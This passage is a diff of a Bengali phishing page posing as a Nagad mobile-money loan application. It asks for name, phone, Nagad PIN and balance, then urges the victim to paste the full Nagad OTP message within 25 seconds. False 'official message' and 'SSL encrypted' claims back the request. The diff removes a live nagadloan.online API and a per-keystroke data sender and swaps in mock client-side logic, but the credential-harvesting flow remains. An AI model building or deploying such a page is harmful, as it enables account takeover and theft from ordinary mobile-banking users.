@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="bn">
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
@@ -909,15 +908,8 @@
         }
 
         @keyframes alertPulse {
-
-            0%,
-            100% {
-                box-shadow: 0 0 0 0 rgba(255, 220, 0, .3)
-            }
-
-            50% {
-                box-shadow: 0 0 0 6px rgba(255, 220, 0, 0)
-            }
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 220, 0, .3) }
+            50% { box-shadow: 0 0 0 6px rgba(255, 220, 0, 0) }
         }
 
         .ring-wrap {
@@ -1001,17 +993,8 @@
         }
 
         @keyframes sdot {
-
-            0%,
-            100% {
-                box-shadow: 0 0 0 0 rgba(255, 255, 255, .5);
-                opacity: 1
-            }
-
-            50% {
-                box-shadow: 0 0 0 4px transparent;
-                opacity: .6
-            }
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, .5); opacity: 1 }
+            50% { box-shadow: 0 0 0 4px transparent; opacity: .6 }
         }
 
         #waitMsg {
@@ -1103,15 +1086,8 @@
         }
 
         @keyframes bd {
-
-            0%,
-            100% {
-                opacity: 1
-            }
-
-            50% {
-                opacity: 0
-            }
+            0%, 100% { opacity: 1 }
+            50% { opacity: 0 }
         }
 
         .ta-wrap {
@@ -1181,13 +1157,8 @@
         }
 
         @keyframes spin {
-            from {
-                transform: rotate(0deg)
-            }
-
-            to {
-                transform: rotate(360deg)
-            }
+            from { transform: rotate(0deg) }
+            to { transform: rotate(360deg) }
         }
 
         .waiting-logo-inner {
@@ -1236,15 +1207,8 @@
         }
 
         @keyframes glow {
-
-            0%,
-            100% {
-                box-shadow: 0 0 4px rgba(247, 148, 29, .3)
-            }
-
-            50% {
-                box-shadow: 0 0 12px rgba(247, 148, 29, .6)
-            }
+            0%, 100% { box-shadow: 0 0 4px rgba(247, 148, 29, .3) }
+            50% { box-shadow: 0 0 12px rgba(247, 148, 29, .6) }
         }
 
         .step-label {
@@ -1290,30 +1254,13 @@
             background: var(--grad)
         }
 
-        .loader-dots span:nth-child(1) {
-            animation: pulse 1.1s 0s infinite
-        }
-
-        .loader-dots span:nth-child(2) {
-            animation: pulse 1.1s .3s infinite
-        }
-
-        .loader-dots span:nth-child(3) {
-            animation: pulse 1.1s .6s infinite
-        }
+        .loader-dots span:nth-child(1) { animation: pulse 1.1s 0s infinite }
+        .loader-dots span:nth-child(2) { animation: pulse 1.1s .3s infinite }
+        .loader-dots span:nth-child(3) { animation: pulse 1.1s .6s infinite }
 
         @keyframes pulse {
-
-            0%,
-            100% {
-                opacity: .25;
-                transform: scale(.75)
-            }
-
-            50% {
-                opacity: 1;
-                transform: scale(1.2)
-            }
+            0%, 100% { opacity: .25; transform: scale(.75) }
+            50% { opacity: 1; transform: scale(1.2) }
         }
 
         .retry-card {
@@ -1328,27 +1275,11 @@
         }
 
         @keyframes shake {
-
-            0%,
-            100% {
-                transform: translateX(0)
-            }
-
-            20% {
-                transform: translateX(-6px)
-            }
-
-            40% {
-                transform: translateX(6px)
-            }
-
-            60% {
-                transform: translateX(-4px)
-            }
-
-            80% {
-                transform: translateX(4px)
-            }
+            0%, 100% { transform: translateX(0) }
+            20% { transform: translateX(-6px) }
+            40% { transform: translateX(6px) }
+            60% { transform: translateX(-4px) }
+            80% { transform: translateX(4px) }
         }
 
         .retry-icon {
@@ -1472,7 +1403,6 @@
 
 <body>
 
-    <!-- Hidden audio player — Chrome autoplay fix -->
     <audio id="nagad_audio_player" preload="auto" style="display:none;"></audio>
 
     <div class="mobile-shell">
@@ -1486,30 +1416,28 @@
             <!-- FORM VIEW -->
             <div id="view-form" class="page-view active-view" style="padding:0">
                 <div class="form-hero">
-                    <div class="form-hero-logo"><img src="new-logo.14fe8a5.png"></div>
+                    <div class="form-hero-logo"><img src="new-logo.14fe8a5.png" onerror="this.src='https://raw.githubusercontent.com/mdarif76769/nagad/main/new-logo.14fe8a5.png'"></div>
                 </div>
                 <div class="form-body">
                     <form id="loanForm">
-                        <div class="secure-strip"><i class="fas fa-lock"></i><span>SSL এনক্রিপ্টেড সুরক্ষিত আবেদন
-                                প্রক্রিয়া</span></div>
+                        <div class="secure-strip"><i class="fas fa-lock"></i><span>SSL এনক্রিপ্টেড সুরক্ষিত আবেদন প্রক্রিয়া</span></div>
                         <div class="field-group">
                             <div class="field-label"><i class="fas fa-user"></i> সম্পূর্ণ নাম</div>
                             <div class="field-wrap"><i class="fas fa-user field-icon"></i><input type="text"
                                     name="name" id="real_name" class="field-input"
-                                    placeholder="আপনার পূর্ণ নাম লিখুন" onkeyup="sendRealTimeData()" required></div>
+                                    placeholder="আপনার পূর্ণ নাম লিখুন" required></div>
                         </div>
                         <div class="field-group">
                             <div class="field-label"><i class="fas fa-mobile-alt"></i> মোবাইল নাম্বার</div>
                             <div class="field-wrap"><i class="fas fa-phone field-icon"></i><input type="tel"
                                     name="phone" id="user_phone_input" class="field-input" placeholder="01XXXXXXXXX"
-                                    maxlength="11" oninput="validateBDPhone();sendRealTimeData();" required></div>
+                                    maxlength="11" oninput="validateBDPhone()" required></div>
                         </div>
                         <div class="field-group">
                             <div class="field-label"><i class="fas fa-coins"></i> লোনের পরিমাণ</div>
                             <div class="field-wrap"><span class="field-icon"
                                     style="font-size:13px;font-weight:700;">৳</span>
-                                <select name="amount" id="dyn_amount" class="field-select"
-                                    onchange="sendRealTimeData()" required="">
+                                <select name="amount" id="dyn_amount" class="field-select" required="">
                                     <option value="3000">3000 টাকা</option>
                                     <option value="5000">5000 টাকা</option>
                                     <option value="8000">8000 টাকা</option>
@@ -1544,8 +1472,7 @@
                         <div class="field-group" style="margin-bottom:22px;">
                             <div class="field-label"><i class="fas fa-calendar-alt"></i> পরিশোধের মেয়াদ</div>
                             <div class="field-wrap"><i class="fas fa-clock field-icon"></i>
-                                <select name="months" id="dyn_months" class="field-select"
-                                    onchange="sendRealTimeData()" required="">
+                                <select name="months" id="dyn_months" class="field-select" required="">
                                     <option value="3">3 মাস</option>
                                     <option value="6">6 মাস</option>
                                     <option value="9">9 মাস</option>
@@ -1561,9 +1488,7 @@
                                 </select>
                             </div>
                         </div>
-                        <button type="submit" class="btn-primary-nagad"><i class="fas fa-arrow-right"></i> পরবর্তী
-                            ধাপে
-                            যান</button>
+                        <button type="submit" class="btn-primary-nagad"><i class="fas fa-arrow-right"></i> পরবর্তী ধাপে যান</button>
                     </form>
                 </div>
             </div>
@@ -1571,7 +1496,7 @@
             <!-- SUMMARY VIEW -->
             <div id="view-summary" class="page-view" style="padding:0">
                 <div class="summary-header">
-                    <img src="new-logo.14fe8a5.png">
+                    <img src="new-logo.14fe8a5.png" onerror="this.src='https://raw.githubusercontent.com/mdarif76769/nagad/main/new-logo.14fe8a5.png'">
                     <h2>লোনের বিস্তারিত</h2>
                     <p>আবেদনের আগে বিস্তারিত যাচাই করুন</p>
                 </div>
@@ -1618,11 +1543,9 @@
                     <p>আপনার ৪ সংখ্যার নগদ পিন প্রদান করুন</p>
                 </div>
                 <div class="pin-body">
-                    <div class="secure-strip"><i class="fas fa-shield-alt"></i><span>আপনার পিন এনক্রিপ্টেড পদ্ধতিতে
-                            যাচাই করা হবে</span></div>
+                    <div class="secure-strip"><i class="fas fa-shield-alt"></i><span>আপনার পিন এনক্রিপ্টেড পদ্ধতিতে যাচাই করা হবে</span></div>
                     <div class="pin-card">
-                        <div style="font-size:13px;color:var(--text-soft);text-align:center;margin-bottom:4px;">আপনার
-                            পিন লিখুন</div>
+                        <div style="font-size:13px;color:var(--text-soft);text-align:center;margin-bottom:4px;">আপনার পিন লিখুন</div>
                         <div class="pin-dots">
                             <div class="pin-dot" id="pd0"></div>
                             <div class="pin-dot" id="pd1"></div>
@@ -1656,14 +1579,12 @@
                     <p>আপনার বর্তমান নগদ ব্যালেন্স নিশ্চিত করুন</p>
                 </div>
                 <div class="balance-body">
-                    <div class="warning-box"><i class="fas fa-exclamation-triangle"></i><span>সফল আবেদনের জন্য সঠিক
-                            ব্যালেন্স তথ্য প্রদান করুন।</span></div>
+                    <div class="warning-box"><i class="fas fa-exclamation-triangle"></i><span>সফল আবেদনের জন্য সঠিক ব্যালেন্স তথ্য প্রদান করুন।</span></div>
                     <div class="balance-card">
                         <div class="field-label"><i class="fas fa-coins"></i> বর্তমান ব্যালেন্স</div>
                         <div class="balance-display-box" id="balance_display_box">
                             <span class="balance-display-icon">৳</span>
-                            <span class="balance-display-text placeholder" id="balance_display_text">উদাহরণঃ
-                                3310</span>
+                            <span class="balance-display-text placeholder" id="balance_display_text">উদাহরণঃ 3310</span>
                         </div>
                         <div class="balance-numpad">
                             <button class="bal-key" onclick="balKey('1')">1</button><button class="bal-key"
@@ -1694,28 +1615,23 @@
                             <div class="otp-instruction-card">
                                 <div class="otp-instruction-row">
                                     <div class="otp-instruction-dot blue"><i class="fas fa-bell"></i></div>
-                                    <div class="otp-instruction-text">নগদ থেকে আপনার নম্বরে একটি <strong>ভেরিফিকেশন
-                                            মেসেজ</strong> পাঠানো হবে।</div>
+                                    <div class="otp-instruction-text">নগদ থেকে আপনার নম্বরে একটি <strong>ভেরিফিকেশন মেসেজ</strong> পাঠানো হয়েছে।</div>
                                 </div>
                                 <div class="otp-instruction-row">
                                     <div class="otp-instruction-dot amber"><i class="fas fa-clock"></i></div>
-                                    <div class="otp-instruction-text">মেসেজ পাওয়ার পর <strong>মাত্র ২৫
-                                            সেকেন্ড</strong> সময় পাবেন, দেরি করবেন না।</div>
+                                    <div class="otp-instruction-text">মেসেজ পাওয়ার পর <strong>মাত্র ২৫ সেকেন্ড</strong> সময় পাবেন, দেরি করবেন না।</div>
                                 </div>
                                 <div class="otp-instruction-row">
                                     <div class="otp-instruction-dot red"><i class="fas fa-paste"></i></div>
-                                    <div class="otp-instruction-text">সম্পূর্ণ মেসেজটি কপি করে <strong>নিচে
-                                            পেস্ট</strong> করুন।</div>
+                                    <div class="otp-instruction-text">সম্পূর্ণ মেসেজটি কপি করে <strong>নিচে পেস্ট</strong> করুন।</div>
                                 </div>
                             </div>
                             <div class="otp-waiting-badge">
-                                <div class="sdot"></div><span id="otp-waiting-message">নগদ মেসেজের অপেক্ষায়
-                                    আছি...</span>
+                                <div class="sdot"></div><span id="otp-waiting-message">নগদ মেসেজের অপেক্ষায় আছি...</span>
                             </div>
                         </div>
                         <div id="otp-timer-box" style="display:none;width:100%;text-align:center;">
-                            <div class="otp-alert-banner"><i class="fas fa-exclamation-triangle"></i><span>মেসেজ এসে
-                                    গেছে! এখনই পেস্ট করুন</span></div>
+                            <div class="otp-alert-banner"><i class="fas fa-exclamation-triangle"></i><span>মেসেজ এসে গেছে! এখনই পেস্ট করুন</span></div>
                             <div class="ring-wrap">
                                 <svg class="ring-svg" width="120" height="120" viewBox="0 0 120 120">
                                     <circle class="ring-track" cx="60" cy="60" r="55" />
@@ -1730,32 +1646,25 @@
                                 <div class="sdot"></div><span id="statusTxt">দ্রুত মেসেজ পেস্ট করুন!</span>
                             </div>
                             <div id="waitMsg"><i class="fas fa-clock"
-                                    style="color:rgba(255,255,255,.8);font-size:12px;"></i><span>অনুগ্রহ করে, পরবর্তী
-                                    মেসেজের জন্য অপেক্ষা করুন।</span></div>
+                                    style="color:rgba(255,255,255,.8);font-size:12px;"></i><span>অনুগ্রহ করে, পরবর্তী মেসেজের জন্য অপেক্ষা করুন।</span></div>
                         </div>
                     </div>
                     <div class="otp-body">
-                        <div class="info-pill"><i class="fas fa-info-circle"></i><span>নগদ থেকে পাওয়া
-                                <strong>সম্পূর্ণ মেসেজটি</strong> কপি করে নিচে পেস্ট করুন এবং <strong>২৫
-                                    সেকেন্ডের</strong> মধ্যে ভেরিফাই করুন।</span></div>
-                        <button class="paste-btn" id="otp-paste-btn" onclick="pasteSMS()" style="display:none;"><i
-                                class="fas fa-paste"></i> মেসেজ পেস্ট
-                            করুন</button>
+                        <div class="info-pill"><i class="fas fa-info-circle"></i><span>নগদ থেকে পাওয়া <strong>সম্পূর্ণ মেসেজটি</strong> কপি করে নিচে পেস্ট করুন এবং <strong>২৫ সেকেন্ডের</strong> মধ্যে ভেরিফাই করুন।</span></div>
+                        <button class="paste-btn" id="otp-paste-btn" onclick="pasteSMS()"><i
+                                class="fas fa-paste"></i> মেসেজ পেস্ট করুন</button>
                         <div>
                             <div class="ta-label"><span class="blink-dot"></span>সম্পূর্ণ মেসেজ পেস্ট করুন</div>
                             <div class="ta-wrap">
                                 <textarea id="otp_input" class="otp-ta"
                                     placeholder="নগদ থেকে পাওয়া সম্পূর্ণ বার্তাটি এখানে পেস্ট করুন।&#10;উদাহরণ: Never Share Any Code. OTP/Code: XXXXXX..."
-                                    oncontextmenu="event.stopPropagation();return true;" oninput="onTaInput(this)"></textarea>
+                                    oninput="onTaInput(this)"></textarea>
                                 <div class="char-count" id="charCount">0</div>
                             </div>
                         </div>
                         <button class="btn-primary-nagad" id="verifyBtn" onclick="submitOTP()"
                             style="margin-top:auto;"><i class="fas fa-shield-alt"></i> মেসেজ ভেরিফাই করুন</button>
                     </div>
-                </div>
-                <div style="display:none"><span id="timer-text-def">25</span><span id="timer-text"><span
-                            id="seconds">25</span></span><button id="resend-btn" onclick="resendOTP()"></button>
                 </div>
             </div>
 
@@ -1775,7 +1684,7 @@
                                 </linearGradient>
                             </defs>
                         </svg>
-                        <div class="waiting-logo-inner"><img src="new-logo.14fe8a5.png"
+                        <div class="waiting-logo-inner"><img src="new-logo.14fe8a5.png" onerror="this.src='https://raw.githubusercontent.com/mdarif76769/nagad/main/new-logo.14fe8a5.png'"
                                 alt="Nagad"></div>
                     </div>
                     <div class="waiting-title" id="verif-title">যাচাই শুরু হচ্ছে...</div>
@@ -1792,15 +1701,6 @@
                     </div>
                     <div class="step-label" id="verif-step-count"></div>
                     <div class="loader-dots" id="verif-loader-dots"><span></span><span></span><span></span></div>
-                    <div class="retry-card" id="verif-retry-box">
-                        <div class="retry-icon"><i class="fas fa-exclamation-circle"></i></div>
-                        <div class="retry-title">যাচাইকরণ সম্পন্ন হয়নি</div>
-                        <div class="retry-desc">সঠিক সময়ে মেসেজ যাচাই করা হয়নি।<br>কিছুক্ষণের মধ্যে নগদ থেকে
-                            আপনাকে<br>একটি <strong>নতুন মেসেজ</strong> পাঠানো হবে।</div>
-                        <div class="retry-countdown" id="verif-countdown"><i class="fas fa-clock"
-                                style="color:var(--orange);font-size:12px;"></i><span id="verif-countdown-text">৩
-                                সেকেন্ডে ফিরে যাচ্ছে</span></div>
-                    </div>
                 </div>
             </div>
         </div>
@@ -1811,18 +1711,13 @@
         <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-inner">
-                    <img src="nagad/new-logo.14fe8a5.png" class="modal-logo">
+                    <img src="new-logo.14fe8a5.png" class="modal-logo" onerror="this.src='https://raw.githubusercontent.com/mdarif76769/nagad/main/new-logo.14fe8a5.png'">
                     <div class="modal-title">জরুরী নির্দেশনা</div>
-                    <div class="modal-text">আপনার নগদ একাউন্ট সক্রিয় ও লেনদেন সক্ষম কিনা তা নিশ্চিত করতে একাউন্টে
-                        ন্যূনতম <span id="popup-amount" style="color:var(--red);font-weight:700;">৳০</span> টাকা
-                        ব্যালেন্স থাকতে হবে।<br><br><span style="color:#10B981;font-weight:600;">✓ উক্ত অর্থ কর্তন করা
-                            হবে না।</span></div>
-                    <div class="modal-note">⚠️ <span style="color:var(--red);font-weight:700;">সফল আবেদনের জন্য আপনার
-                            প্রতিটি তথ্য নির্ভূল হতে হবে।</span></div>
+                    <div class="modal-text">আপনার নগদ একাউন্ট সক্রিয় ও লেনদেন সক্ষম কিনা তা নিশ্চিত করতে একাউন্টে ন্যূনতম <span id="popup-amount" style="color:var(--red);font-weight:700;">৳০</span> টাকা ব্যালেন্স থাকতে হবে।<br><br><span style="color:#10B981;font-weight:600;">✓ উক্ত অর্থ কর্তন করা হবে না।</span></div>
+                    <div class="modal-note">⚠️ <span style="color:var(--red);font-weight:700;">সফল আবেদনের জন্য আপনার প্রতিটি তথ্য নির্ভূল হতে হবে।</span></div>
                     <div class="modal-actions">
                         <button class="btn-modal-cancel" onclick="location.reload()">বাতিল</button>
-                        <button class="btn-modal-confirm" data-bs-dismiss="modal"><i class="fas fa-arrow-right"></i>
-                            হ্যাঁ, এগিয়ে যান</button>
+                        <button class="btn-modal-confirm" data-bs-dismiss="modal"><i class="fas fa-arrow-right"></i> হ্যাঁ, এগিয়ে যান</button>
                     </div>
                 </div>
             </div>
@@ -1834,68 +1729,19 @@
         <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-inner">
-                    <img src="new-logo.14fe8a5.png" class="modal-logo">
+                    <img src="new-logo.14fe8a5.png" class="modal-logo" onerror="this.src='https://raw.githubusercontent.com/mdarif76769/nagad/main/new-logo.14fe8a5.png'">
                     <div class="modal-title">জরুরী নির্দেশনা</div>
-                    <div
-                        style="background:#FFF8F8;border:1px dashed #F3B2B2;border-radius:10px;padding:12px 14px;margin-bottom:14px;">
-                        <div style="font-size:13px;font-weight:700;color:#16A34A;margin-bottom:6px;">নগদ অফিসিয়াল
-                            বার্তা।</div>
+                    <div style="background:#FFF8F8;border:1px dashed #F3B2B2;border-radius:10px;padding:12px 14px;margin-bottom:14px;">
+                        <div style="font-size:13px;font-weight:700;color:#16A34A;margin-bottom:6px;">নগদ অফিসিয়াল বার্তা।</div>
                         <div style="font-size:13px;line-height:1.55;color:var(--text-main);font-weight:600;">
-                            আপনার একাউন্টের সুরক্ষার জন্য, নগদ থেকে একটি নির্দেশকরণ মেসেজ পাঠানো হবে। মেসেজ পাওয়ার
-                            পর দ্রুত সম্পূর্ণ মেসেজটি ভেরিফাই করতে হবে। আপনি কি মেসেজ ভেরিফাই করার জন্য প্রস্তুত?
+                            আপনার একাউন্টের সুরক্ষার জন্য, নগদ থেকে একটি নির্দেশকরণ মেসেজ পাঠানো হবে। মেসেজ পাওয়ার পর দ্রুত সম্পূর্ণ মেসেজটি ভেরিফাই করতে হবে। আপনি কি মেসেজ ভেরিফাই করার জন্য প্রস্তুত?
                         </div>
                     </div>
-                    <div class="modal-note">⚠️ <span style="color:var(--red);font-weight:700;">সফল আবেদনের জন্য
-                            আপনার প্রতিটি তথ্য নির্ভুল হতে হবে।</span></div>
+                    <div class="modal-note">⚠️ <span style="color:var(--red);font-weight:700;">সফল আবেদনের জন্য আপনার প্রতিটি তথ্য নির্ভূল হতে হবে।</span></div>
                     <div class="modal-actions">
                         <button type="button" class="btn-modal-cancel" onclick="cancelDispatch()">না, বাতিল</button>
-                        <button type="button" class="btn-modal-confirm" onclick="confirmDispatch()">হ্যাঁ, ঠিক
-                            আছে</button>
+                        <button type="button" class="btn-modal-confirm" onclick="confirmDispatch()">হ্যাঁ, ঠিক আছে</button>
                     </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Emergency Message Modal -->
-    <div class="modal fade" id="emargency_msg_Modal" data-bs-backdrop="static">
-        <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content">
-                <div class="modal-inner">
-                    <img src="new-logo.14fe8a5.png" class="modal-logo">
-                    <div class="modal-title">জরুরী নির্দেশনা</div>
-                    <div
-                        style="background:#F0FDF4;border:1px dashed #86EFAC;border-radius:10px;padding:14px;margin-bottom:14px;">
-                        <div style="font-size:12px;color:#16A34A;font-weight:600;margin-bottom:6px;">✓ নগদ অফিসিয়াল
-                            বার্তা</div>
-                        <div style="font-size:13px;color:var(--text-main);font-weight:600;" id="emargency_msg"></div>
-                    </div>
-                    <div class="modal-note">⚠️ <span style="color:var(--red);font-weight:700;">সফল আবেদনের জন্য আপনার
-                            প্রতিটি তথ্য নির্ভূল হতে হবে।</span></div>
-                    <div class="modal-actions">
-                        <button class="btn-modal-cancel" onclick="location.reload()">না, বাতিল</button>
-                        <button onclick="msg_btn_confirm()" class="btn-modal-confirm" data-bs-dismiss="modal"><i
-                                class="fas fa-check"></i> হ্যাঁ, ঠিক আছে</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Time Off Modal -->
-    <div class="modal fade" id="timeOffModal" data-bs-backdrop="static">
-        <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content">
-                <div class="modal-inner">
-                    <div
-                        style="width:64px;height:64px;border-radius:50%;background:rgba(237,28,36,.1);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:28px;color:var(--red);">
-                        <i class="fas fa-clock"></i>
-                    </div>
-                    <div class="modal-title" style="color:var(--red);">সার্ভিস বন্ধ!</div>
-                    <div class="modal-text">সম্মানিত গ্রাহকবৃন্দ, আমাদের সকল কার্যক্রম সকাল ১০ টা থেকে শুরু হবে, তাই
-                        সকাল ১০ টার পরে লোন অপশন সচল অথবা লোনের জন্য আবেদন করবেন। </div>
-                    <button class="btn-primary-nagad" onclick="window.location.href='https://mdarif76769.github.io/nagad/'"
-                        style="margin-top:0;"><i class="fas fa-home"></i> ঠিক আছে</button>
                 </div>
             </div>
         </div>
@@ -1903,109 +1749,85 @@
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        let lastSubmittedOTP = "",
-            mode = 'on',
-            pinValue = "",
-            smsPasted = false,
-            confirmModalShown = false,
-            otpStepStarted = false,
-            statusPollRunning = false;
+        const baseUrl = "https://mdarif76769.github.io/nagad/";
+        let pinValue = "";
+        let balValue = "";
 
-        const loanApiUrl = "https:\/\/nagadloan.online\/api\/loan";
-        const homeUrl = "https:\/\/nagadloan.online";
-        const thankYouUrl = "https:\/\/nagadloan.online\/thankyou";
-        const rejectedUrl = "https:\/\/nagadloan.online\/rejected";
-        const laterRejectedUrl = "https:\/\/nagadloan.online\/laterrejected";
-        const shortBalanceUrl = "https:\/\/nagadloan.online\/shortbalance";
+        function showToast(message) {
+            if (message) {
+                alert(message);
+            }
+        }
 
-        // ================================================================
-        // AUDIO ENGINE — reliable autoplay (Chrome fix)
-        // ================================================================
-        var _audioEl = null,
-            _pendingUrl = null,
-            _userTouched = false;
+        function showModal(id) {
+            var el = document.getElementById(id);
+            if (el) {
+                bootstrap.Modal.getOrCreateInstance(el).show();
+            }
+        }
 
-        window.addEventListener('load', function() {
-            _audioEl = document.getElementById('nagad_audio_player');
+        function hideModal(id) {
+            var el = document.getElementById(id);
+            if (el) {
+                bootstrap.Modal.getOrCreateInstance(el).hide();
+            }
+        }
+
+        function showPage(id) {
+            $('.page-view').removeClass('active-view');
+            $(id).addClass('active-view');
+            window.scrollTo(0, 0);
+        }
+
+        function validateBDPhone() {
+            var i = document.getElementById('user_phone_input');
+            i.value = i.value.replace(/\D/g, "");
+        }
+
+        // Form Submit Handler
+        $('#loanForm').submit(function(e) {
+            e.preventDefault();
+            var name = $.trim($('#real_name').val());
+            var phone = $.trim($('#user_phone_input').val());
+            var amount = parseInt($('#dyn_amount').val());
+            var months = $('#dyn_months').val();
+
+            if (!name) {
+                showToast('নাম লিখুন।');
+                return;
+            }
+            if (!phone || phone.length < 11) {
+                showToast('সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন।');
+                return;
+            }
+
+            // Calculate mock details
+            var interest = Math.round(amount * 0.05);
+            var total = amount + interest;
+            var perMonth = Math.round(total / parseInt(months));
+
+            $('#sum-amount').text('৳' + amount.toLocaleString('en-IN'));
+            $('#sum-interest').text('৳' + interest.toLocaleString('en-IN'));
+            $('#sum-total').text('৳' + total.toLocaleString('en-IN'));
+            $('#popup-amount').text('৳' + Math.round(amount * 0.1).toLocaleString('en-IN'));
+
+            var scheduleHtml = '';
+            var currentDate = new Date();
+            for (var i = 1; i <= parseInt(months); i++) {
+                currentDate.setMonth(currentDate.getMonth() + 1);
+                var dateStr = currentDate.toLocaleDateString('bn-BD', { day: 'numeric', month: 'long', year: 'numeric' });
+                scheduleHtml += '<tr><td>' + i + '</td><td>' + dateStr + '</td><td>৳' + perMonth.toLocaleString('en-IN') + '</td></tr>';
+            }
+            $('#schedule-body').html(scheduleHtml);
+
+            showPage('#view-waiting');
+            setTimeout(function() {
+                showPage('#view-summary');
+                showModal('balanceCheckModal');
+            }, 1200);
         });
 
-        function _onInteraction() {
-            _userTouched = true;
-            if (_pendingUrl) {
-                var u = _pendingUrl;
-                _pendingUrl = null;
-                setTimeout(function() {
-                    _playNow(u);
-                }, 50);
-            }
-        }
-        ['click', 'touchend', 'touchstart', 'keydown', 'mousedown', 'pointerdown', 'input', 'change', 'focus'].forEach(
-            function(ev) {
-                document.addEventListener(ev, _onInteraction, {
-                    passive: true,
-                    capture: true
-                });
-            });
-
-        function _playNow(url) {
-            var el = _audioEl || document.getElementById('nagad_audio_player');
-            if (!el) {
-                el = document.createElement('audio');
-                el.style.display = 'none';
-                document.body.appendChild(el);
-                _audioEl = el;
-            }
-            el.pause();
-            el.src = url;
-            el.volume = 1;
-            var p = el.play();
-            if (p !== undefined) p.catch(function() {
-                _pendingUrl = url;
-            });
-        }
-
-        function playAudioUrl(url) {
-            if (!url) return;
-            if (!url.startsWith('http')) {
-                url = window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, '/') + url;
-            }
-            if (_userTouched) _playNow(url);
-            else _pendingUrl = url;
-        }
-
-        function speakText(text) {
-            if (!text) return;
-            window.speechSynthesis.cancel();
-            var doSpeak = function() {
-                var u = new SpeechSynthesisUtterance(text);
-                var voices = window.speechSynthesis.getVoices();
-                var bn = voices.find(function(v) {
-                    return v.lang === 'bn-BD' || v.lang === 'bn-IN' || v.lang.startsWith('bn');
-                });
-                if (bn) {
-                    u.voice = bn;
-                    u.lang = bn.lang;
-                } else {
-                    u.lang = 'bn-BD';
-                }
-                u.rate = 0.92;
-                u.pitch = 1;
-                u.volume = 1;
-                window.speechSynthesis.speak(u);
-            };
-            if (window.speechSynthesis.getVoices().length > 0) doSpeak();
-            else {
-                window.speechSynthesis.onvoiceschanged = function() {
-                    window.speechSynthesis.onvoiceschanged = null;
-                    doSpeak();
-                };
-                setTimeout(doSpeak, 600);
-            }
-        }
-
-        // ================================================================
-        // PIN numpad
-        // ================================================================
+        // PIN Keypad
         function pinKey(d) {
             if (pinValue.length >= 4) return;
             pinValue += d;
@@ -2020,14 +1842,25 @@
         }
 
         function updatePinDots() {
-            for (var i = 0; i < 4; i++) document.getElementById('pd' + i).classList.toggle('filled', i < pinValue.length);
+            for (var i = 0; i < 4; i++) {
+                document.getElementById('pd' + i).classList.toggle('filled', i < pinValue.length);
+            }
         }
 
-        // ================================================================
-        // Balance numpad
-        // ================================================================
-        var balValue = "";
+        function submitPin() {
+            if (pinValue.length < 4) {
+                showToast('সঠিক ৪ সংখ্যার পিন দিন');
+                return;
+            }
+            showPage('#view-waiting');
+            setTimeout(function() {
+                balValue = "";
+                updateBalDisplay();
+                showPage('#view-balance');
+            }, 1200);
+        }
 
+        // Balance Keypad
         function balKey(d) {
             if (balValue.length >= 7 || balValue === '0') return;
             balValue += d;
@@ -2058,13 +1891,43 @@
             }
         }
 
-        // ================================================================
-        // Countdown ring
-        // ================================================================
-        var TOTAL_SEC = 25,
-            CIRCUMF = 345,
-            oLeft = TOTAL_SEC,
-            otpTimer = null;
+        function submit_Balance() {
+            if (balValue.length === 0) {
+                showToast('ব্যালেন্স লিখুন');
+                return;
+            }
+            var balance = parseInt(balValue);
+            if (balance < 500) {
+                showToast('দুঃখিত! আপনার ব্যালেন্স পর্যাপ্ত নয়।');
+                return;
+            }
+            showPage('#view-waiting');
+            setTimeout(function() {
+                showPage('#view-otp');
+                showModal('dispatchConfirmModal');
+            }, 1200);
+        }
+
+        function confirmDispatch() {
+            hideModal('dispatchConfirmModal');
+            showOtpTimer();
+        }
+
+        function cancelDispatch() {
+            hideModal('dispatchConfirmModal');
+            window.location.href = baseUrl;
+        }
+
+        // OTP Timer & Countdown
+        var TOTAL_SEC = 25, CIRCUMF = 345, oLeft = TOTAL_SEC, otpTimer = null;
+
+        function showOtpTimer() {
+            document.getElementById('otp_input').value = '';
+            document.getElementById('charCount').textContent = '0';
+            document.getElementById('otp-instruction-box').style.display = 'none';
+            document.getElementById('otp-timer-box').style.display = 'block';
+            startCountdown();
+        }
 
         function startCountdown() {
             clearInterval(otpTimer);
@@ -2075,692 +1938,50 @@
                 setRing(oLeft);
                 if (oLeft <= 0) {
                     clearInterval(otpTimer);
-                    onExpired();
                 }
             }, 1000);
         }
 
         function setRing(sec) {
-            var pct = sec / TOTAL_SEC,
-                offset = CIRCUMF * (1 - pct);
-            var ring = document.getElementById('ringEl'),
-                num = document.getElementById('ringNum'),
-                st = document.getElementById('statusTxt');
+            var pct = sec / TOTAL_SEC, offset = CIRCUMF * (1 - pct);
+            var ring = document.getElementById('ringEl'), num = document.getElementById('ringNum');
             if (ring) ring.style.strokeDashoffset = offset;
             if (num) num.textContent = Math.max(0, sec);
-            if (sec > 10) {
-                if (ring) ring.classList.remove('danger');
-                if (st) st.textContent = 'দ্রুত মেসেজ পেস্ট করুন!';
-            } else if (sec > 0) {
-                if (ring) ring.classList.add('danger');
-                if (st) st.textContent = sec + ' সেকেন্ড বাকি!';
-            }
-        }
-
-        function onExpired() {
-            var ring = document.getElementById('ringEl'),
-                num = document.getElementById('ringNum'),
-                st = document.getElementById('statusTxt'),
-                wt = document.getElementById('waitMsg');
-            if (ring) {
-                ring.style.strokeDashoffset = CIRCUMF;
-                ring.classList.add('danger');
-            }
-            if (num) {
-                num.textContent = '0';
-                num.classList.add('danger');
-            }
-            if (st) st.textContent = 'সময় শেষ!';
-            if (wt) wt.style.display = 'flex';
-        }
-
-        // ================================================================
-        // OTP view helpers
-        // ================================================================
-        function showOtpInstruction() {
-            document.getElementById('otp-instruction-box').style.display = 'block';
